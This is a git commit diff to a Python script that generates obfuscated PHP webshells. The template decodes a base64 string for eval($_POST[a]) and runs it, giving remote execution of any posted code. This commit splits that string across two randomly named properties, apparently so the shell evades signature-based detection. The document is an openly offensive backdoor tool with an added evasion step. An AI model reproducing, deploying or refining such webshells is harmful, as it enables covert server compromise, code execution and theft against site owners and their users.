370be0b726605e9ccaadb1d7682455c2841f8ad6
pureqh <45117428+pureqh@users.noreply.github.com>
2020-09-04 23:41:02 +0800

    Update php_webshell.py

--- php_webshell.py
+++ php_webshell.py
@@ -8,9 +8,11 @@ shell = '''<?php
 class {0}{3}
         public ${1} = null;
         public ${2} = null;
+        public ${6} = null;
         function __construct(){3}
-        $this->{1}='ZXZhbCgkX1BPU1RbYV0pOw==';
-        $this->{2} = @base64_decode( $this->{1} );
+        $this->{1} = 'ZXZhbCgkX1BPU';
+        $this->{6} = '1RbYV0pOw==';
+        $this->{2} = @base64_decode($this->{1}.$this->{6});
         @eval({5}.$this->{2}.{5});
         {4}{4}
 new {0}();
@@ -32,7 +34,8 @@ def build_webshell():
     lef = '''{'''
     rig = '''}'''
     disrupt = "\"/*"+random_keys(7)+"*/\""
-    shellc = shell.format(className,parameter1,parameter2,lef,rig,disrupt)
+    parameter3 = random_name(6)
+    shellc = shell.format(className,parameter1,parameter2,lef,rig,disrupt,parameter3)
     return shellc
 
 
